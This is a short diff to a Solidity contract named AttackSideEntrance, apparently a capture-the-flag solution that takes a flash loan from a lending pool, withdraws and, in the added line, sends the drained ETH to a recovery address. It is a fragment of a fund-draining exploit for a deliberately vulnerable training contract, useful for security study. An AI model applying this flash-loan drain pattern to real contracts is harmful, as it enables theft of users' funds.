@@ -18,6 +18,8 @@ contract AttackSideEntrance {
     function attack() external {
         pool.flashLoan(amount);
         pool.withdraw();
+
+        SafeTransferLib.safeTransferETH(recovery, amount);
     }
 
     function execute() external payable {
